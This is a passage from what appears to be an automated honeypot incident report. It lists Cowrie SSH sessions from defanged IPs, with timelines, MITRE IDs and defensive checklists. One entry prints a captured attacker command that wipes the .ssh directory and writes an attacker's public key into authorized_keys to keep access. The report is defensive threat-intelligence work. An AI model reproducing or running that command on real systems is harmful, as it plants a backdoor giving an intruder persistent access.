| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:44:52` | `cowrie.session.connect` |
| `2026-08-20 09:44:52` | `cowrie.client.version` |
| `2026-08-20 09:44:52` | `cowrie.client.kex` |
| `2026-08-20 09:44:53` | `cowrie.login.success` |
| `2026-08-20 09:44:53` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:44:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 09:44:54` | `cowrie.direct-tcpip.data` |
| `2026-08-20 09:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d57a28b1bf4c

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]166` |
| **First Seen** | 2026-08-20 09:47 |
| **Last Seen** | 2026-08-20 09:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:47:42` | `cowrie.session.connect` |
| `2026-08-20 09:47:43` | `cowrie.client.version` |
| `2026-08-20 09:47:43` | `cowrie.client.kex` |
| `2026-08-20 09:47:45` | `cowrie.login.success` |
| `2026-08-20 09:47:46` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]166` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10b238ef4575

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-08-20 09:47 |
| **Last Seen** | 2026-08-20 09:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:47:56` | `cowrie.session.connect` |
| `2026-08-20 09:47:56` | `cowrie.client.version` |
| `2026-08-20 09:47:56` | `cowrie.client.kex` |
| `2026-08-20 09:47:58` | `cowrie.login.success` |
| `2026-08-20 09:47:58` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd194394d04

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:48 |
| **Last Seen** | 2026-08-20 09:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:48:50` | `cowrie.session.connect` |
| `2026-08-20 09:48:50` | `cowrie.client.version` |
| `2026-08-20 09:48:50` | `cowrie.client.kex` |
| `2026-08-20 09:48:55` | `cowrie.login.success` |
| `2026-08-20 09:48:55` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:48:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 09:48:56` | `cowrie.direct-tcpip.data` |
| `2026-08-20 09:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b90eb8f5344b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-20 09:51 |
| **Last Seen** | 2026-08-20 09:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:51:09` | `cowrie.session.connect` |
| `2026-08-20 09:51:09` | `cowrie.client.version` |
| `2026-08-20 09:51:09` | `cowrie.client.kex` |
| `2026-08-20 09:51:10` | `cowrie.login.success` |
| `2026-08-20 09:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-396106edd836

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-20 09:51 |
| **Last Seen** | 2026-08-20 09:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:51:09` | `cowrie.session.connect` |
| `2026-08-20 09:51:09` | `cowrie.client.version` |
| `2026-08-20 09:51:10` | `cowrie.client.kex` |
| `2026-08-20 09:51:10` | `cowrie.login.success` |
| `2026-08-20 09:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d30478dafcf

| Field | Detail |
|---|---|
| **Source IP** | `122.117.30[.]20` |
| **First Seen** | 2026-08-20 09:51 |
| **Last Seen** | 2026-08-20 09:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:51:35` | `cowrie.session.connect` |
| `2026-08-20 09:51:36` | `cowrie.client.version` |
| `2026-08-20 09:51:36` | `cowrie.client.kex` |
| `2026-08-20 09:51:39` | `cowrie.login.success` |
| `2026-08-20 09:51:39` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.117.30[.]20` to AbuseIPDB if not already reported
- [ ] Block `122.117.30[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a4a861b1b06

| Field | Detail |
|---|---|
| **Source IP** | `182.42.113[.]10` |
| **First Seen** | 2026-08-20 09:51 |
| **Last Seen** | 2026-08-20 09:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:51:46` | `cowrie.session.connect` |
| `2026-08-20 09:51:47` | `cowrie.client.version` |
| `2026-08-20 09:51:47` | `cowrie.client.kex` |
| `2026-08-20 09:51:50` | `cowrie.login.success` |
| `2026-08-20 09:51:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.42.113[.]10` to AbuseIPDB if not already reported
- [ ] Block `182.42.113[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc64900fd3c3

| Field | Detail |
|---|---|
| **Source IP** | `61.169.54[.]150` |
| **First Seen** | 2026-08-20 09:51 |
| **Last Seen** | 2026-08-20 09:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:51:49` | `cowrie.session.connect` |
| `2026-08-20 09:51:51` | `cowrie.client.version` |
| `2026-08-20 09:51:51` | `cowrie.client.kex` |
| `2026-08-20 09:51:53` | `cowrie.login.success` |
| `2026-08-20 09:51:54` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.54[.]150` to AbuseIPDB if not already reported
- [ ] Block `61.169.54[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5cbf67f97e8

| Field | Detail |
|---|---|
| **Source IP** | `41.220.3[.]101` |
| **First Seen** | 2026-08-20 09:52 |
| **Last Seen** | 2026-08-20 09:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:52:04` | `cowrie.session.connect` |
| `2026-08-20 09:52:05` | `cowrie.client.version` |
| `2026-08-20 09:52:05` | `cowrie.client.kex` |
| `2026-08-20 09:52:06` | `cowrie.login.success` |
| `2026-08-20 09:52:07` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.220.3[.]101` to AbuseIPDB if not already reported
- [ ] Block `41.220.3[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d958c7e90bd

| Field | Detail |
|---|---|
| **Source IP** | `89.126.222[.]163` |
| **First Seen** | 2026-08-20 09:54 |
| **Last Seen** | 2026-08-20 09:55 |
| **Session Duration** | 59s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:54:56` | `cowrie.session.connect` |
| `2026-08-20 09:54:56` | `cowrie.client.version` |
| `2026-08-20 09:54:56` | `cowrie.client.kex` |
| `2026-08-20 09:54:57` | `cowrie.login.success` |
| `2026-08-20 09:55:55` | `cowrie.session.file_upload` |
| `2026-08-20 09:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.126.222[.]163` to AbuseIPDB if not already reported
- [ ] Block `89.126.222[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2293d8d6c50

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:55 |
| **Last Seen** | 2026-08-20 09:55 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:55:36` | `cowrie.session.connect` |
| `2026-08-20 09:55:36` | `cowrie.client.version` |
| `2026-08-20 09:55:36` | `cowrie.client.kex` |
| `2026-08-20 09:55:38` | `cowrie.login.success` |
| `2026-08-20 09:55:40` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:55:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 09:55:47` | `cowrie.direct-tcpip.data` |
| `2026-08-20 09:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3992317f31d1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 09:59 |
| **Last Seen** | 2026-08-20 09:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 09:59:46` | `cowrie.session.connect` |
| `2026-08-20 09:59:46` | `cowrie.client.version` |
| `2026-08-20 09:59:47` | `cowrie.client.kex` |
| `2026-08-20 09:59:48` | `cowrie.login.success` |
| `2026-08-20 09:59:48` | `cowrie.direct-tcpip.request` |
| `2026-08-20 09:59:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 09:59:48` | `cowrie.direct-tcpip.data` |
| `2026-08-20 09:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b69018054f0b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 10:05 |
| **Last Seen** | 2026-08-20 10:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:05:30` | `cowrie.session.connect` |
| `2026-08-20 10:05:30` | `cowrie.client.version` |
| `2026-08-20 10:05:30` | `cowrie.client.kex` |
| `2026-08-20 10:05:31` | `cowrie.login.success` |
| `2026-08-20 10:05:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:05:31` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9145bfceb392

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:06 |
| **Last Seen** | 2026-08-20 10:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:06:22` | `cowrie.session.connect` |
| `2026-08-20 10:06:23` | `cowrie.client.version` |
| `2026-08-20 10:06:23` | `cowrie.client.kex` |
| `2026-08-20 10:06:24` | `cowrie.login.success` |
| `2026-08-20 10:06:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:06:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 10:06:24` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d16fe7bfb0

| Field | Detail |
|---|---|
| **Source IP** | `121.202.138[.]181` |
| **First Seen** | 2026-08-20 10:09 |
| **Last Seen** | 2026-08-20 10:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:09:13` | `cowrie.session.connect` |
| `2026-08-20 10:09:14` | `cowrie.client.version` |
| `2026-08-20 10:09:14` | `cowrie.client.kex` |
| `2026-08-20 10:09:17` | `cowrie.login.success` |
| `2026-08-20 10:09:18` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.138[.]181` to AbuseIPDB if not already reported
- [ ] Block `121.202.138[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0625bbd0127

| Field | Detail |
|---|---|
| **Source IP** | `83.166.50[.]15` |
| **First Seen** | 2026-08-20 10:09 |
| **Last Seen** | 2026-08-20 10:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:09:29` | `cowrie.session.connect` |
| `2026-08-20 10:09:29` | `cowrie.client.version` |
| `2026-08-20 10:09:29` | `cowrie.client.kex` |
| `2026-08-20 10:09:31` | `cowrie.login.success` |
| `2026-08-20 10:09:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.166.50[.]15` to AbuseIPDB if not already reported
- [ ] Block `83.166.50[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b64d335216ca

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:10 |
| **Last Seen** | 2026-08-20 10:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:10:37` | `cowrie.session.connect` |
| `2026-08-20 10:10:37` | `cowrie.client.version` |
| `2026-08-20 10:10:37` | `cowrie.client.kex` |
| `2026-08-20 10:10:39` | `cowrie.login.success` |
| `2026-08-20 10:10:39` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:10:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 10:10:41` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04b498db8e5a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:17 |
| **Last Seen** | 2026-08-20 10:22 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:17:10` | `cowrie.session.connect` |
| `2026-08-20 10:17:10` | `cowrie.client.version` |
| `2026-08-20 10:17:10` | `cowrie.client.kex` |
| `2026-08-20 10:17:11` | `cowrie.login.success` |
| `2026-08-20 10:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bea77c4f6ac8

| Field | Detail |
|---|---|
| **Source IP** | `189.167.213[.]64` |
| **First Seen** | 2026-08-20 10:18 |
| **Last Seen** | 2026-08-20 10:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:18:05` | `cowrie.session.connect` |
| `2026-08-20 10:18:05` | `cowrie.client.version` |
| `2026-08-20 10:18:05` | `cowrie.client.kex` |
| `2026-08-20 10:18:05` | `cowrie.login.success` |
| `2026-08-20 10:18:06` | `cowrie.session.params` |
| `2026-08-20 10:18:06` | `cowrie.command.input` |
| `2026-08-20 10:18:06` | `cowrie.command.failed` |
| `2026-08-20 10:18:06` | `cowrie.log.closed` |
| `2026-08-20 10:18:07` | `cowrie.session.params` |
| `2026-08-20 10:18:07` | `cowrie.command.input` |
| `2026-08-20 10:18:07` | `cowrie.session.file_download` |
| `2026-08-20 10:18:07` | `cowrie.log.closed` |
| `2026-08-20 10:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.167.213[.]64` to AbuseIPDB if not already reported
- [ ] Block `189.167.213[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51bc819efb29

| Field | Detail |
|---|---|
| **Source IP** | `189.167.213[.]64` |
| **First Seen** | 2026-08-20 10:18 |
| **Last Seen** | 2026-08-20 10:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:18:07` | `cowrie.session.connect` |
| `2026-08-20 10:18:07` | `cowrie.client.version` |
| `2026-08-20 10:18:07` | `cowrie.client.kex` |
| `2026-08-20 10:18:08` | `cowrie.login.success` |
| `2026-08-20 10:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.167.213[.]64` to AbuseIPDB if not already reported
- [ ] Block `189.167.213[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18ebad7b24be

| Field | Detail |
|---|---|
| **Source IP** | `189.167.213[.]64` |
| **First Seen** | 2026-08-20 10:18 |
| **Last Seen** | 2026-08-20 10:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:18:08` | `cowrie.session.connect` |
| `2026-08-20 10:18:08` | `cowrie.client.version` |
| `2026-08-20 10:18:08` | `cowrie.client.kex` |
| `2026-08-20 10:18:08` | `cowrie.login.success` |
| `2026-08-20 10:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.167.213[.]64` to AbuseIPDB if not already reported
- [ ] Block `189.167.213[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb08a9cb0ce

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-08-20 10:20 |
| **Last Seen** | 2026-08-20 10:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:20:57` | `cowrie.session.connect` |
| `2026-08-20 10:20:57` | `cowrie.client.version` |
| `2026-08-20 10:20:57` | `cowrie.client.kex` |
| `2026-08-20 10:21:00` | `cowrie.login.success` |
| `2026-08-20 10:21:00` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-261bbedf34e1

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-08-20 10:21 |
| **Last Seen** | 2026-08-20 10:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:21:06` | `cowrie.session.connect` |
| `2026-08-20 10:21:07` | `cowrie.client.version` |
| `2026-08-20 10:21:07` | `cowrie.client.kex` |
| `2026-08-20 10:21:08` | `cowrie.login.success` |
| `2026-08-20 10:21:09` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a54ce37e6a85

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 10:21 |
| **Last Seen** | 2026-08-20 10:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 10:21:42` | `cowrie.session.connect` |
| `2026-08-20 10:21:42` | `cowrie.client.version` |
| `2026-08-20 10:21:42` | `cowrie.client.kex` |
| `2026-08-20 10:21:43` | `cowrie.login.success` |
| `2026-08-20 10:21:43` | `cowrie.direct-tcpip.request` |
| `2026-08-20 10:21:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 10:21:44` | `cowrie.direct-tcpip.data` |
| `2026-08-20 10:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
